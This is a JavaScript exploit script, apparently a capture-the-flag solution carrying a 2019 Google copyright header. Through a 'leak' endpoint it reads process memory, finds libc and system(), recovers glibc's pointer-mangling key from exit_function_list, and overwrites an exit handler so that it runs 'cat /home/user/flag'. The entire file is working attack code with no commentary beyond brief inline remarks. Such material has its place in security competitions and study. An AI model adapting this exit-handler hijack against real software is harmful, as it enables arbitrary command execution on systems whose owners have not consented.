// Copyright 2019 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//    https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

function hex(value, count) {
  const alphabet = '0123456789abcdef';
  var result = '';
  for (var i = (count / 4) - 1; i >= 0; --i) {
    result += alphabet[(value >> (i * 4)) & 0xf];
  }
  return result;
}

function hexdump(view) {
  output = '';
  ascii = '';
  for (var i = 0; i < view.byteLength; ++i) {
    if (i % 16 == 0) {
      output += hex(i, 16) + ':  ';
    }

    byte = view.getUint8(i);
    output += hex(byte, 8) + ' ';
    if (0x20 <= byte && byte <= 0x7e) {
      ascii += String.fromCharCode(byte);
    } else {
      ascii += '.';
    }

    if (i % 16 == 15) {
      output += ' ' + ascii + '\n';
      ascii = '';
    }
  }

  if (i % 16 != 15) {
    for (var j = i % 16; j < 16; ++j) {
      output += '   ';
    }
    output += ' ' + ascii + '\n';
  }

  return output;
}

async function read(size, offset) {
  let request = new Request('leak?size=0x' + size.toString(16) + '&offset=0x' + offset.toString(16));
  let response = await fetch(request);
  let result = await response.arrayBuffer();
  return result;
}

async function write(offset, data) {
  let reader = new FileReader();
  let blob = new Blob([data], {type: "exploit"});
  let result = await reader.readAsArrayBuffer(blob, offset)
}

async function main() {
  const mmap_size = 0x1000;

  const elf_magic = 0x464c457f;
  const libc_offset = 0x13049000;

  var dv = new DataView(await read(mmap_size, libc_offset));
  if (dv.getUint32(0, true) != elf_magic) {
    return;
  }

  const libc_page_offset = 0x39a000;
  const libc_main_arena_offset = 0x399b00n;
  const libc_system_offset = 0x3f480n;

  const main_arena_ptr_offset = 0x368;
  const exit_function_list_offset = 0xc20;

  var dv = new DataView(await read(mmap_size, libc_offset + libc_page_offset));
  log(hexdump(dv));

  var libc = dv.getBigUint64(main_arena_ptr_offset, true) - libc_main_arena_offset;
  log('libc: ' + libc.toString(16));
  log('system: ' + (libc + libc_system_offset).toString(16));

  // we need to break the hardcore encryption used to protect exit_function_list

  // to do this, we use that the first function in exit_function_list has an
  // argument pointer that's at a known offset from the function pointer, so we
  // can trivially retrieve the xor key.

  const crib_offset = -0x20cbd0n;
  var crypt_ptr = dv.getBigUint64(exit_function_list_offset + 0x18, true);
  var crib_ptr = dv.getBigUint64(exit_function_list_offset + 0x28, true) + crib_offset;


  crypt_ptr = BigInt.asUintN(64, (crypt_ptr >> 0x11n) | (crypt_ptr << 0x2fn));
  log('crypt: ' + crypt_ptr.toString(16));
  log('crib: ' + crib_ptr.toString(16));

  var key = crypt_ptr ^ crib_ptr;

  ptr = (libc + libc_system_offset) ^ key;
  ptr = BigInt.asUintN(64, (ptr >> 0x2fn) | (ptr << 0x11n));

  dv.setBigUint64(exit_function_list_offset + 0x18, ptr, true);

  // we also need a string to execute
  var cmd_ptr = libc + BigInt(libc_page_offset + exit_function_list_offset + 0x200);
  var cmd = "cat /home/user/flag\0";
  for (var i = 0; i < cmd.length; ++i) {
    dv.setUint8(exit_function_list_offset + 0x200 + i, cmd.charCodeAt(i));
  }
  dv.setBigUint64(exit_function_list_offset + 0x20, cmd_ptr, true);

  log(hexdump(dv));
  write(libc_offset + libc_page_offset, dv.buffer);
}
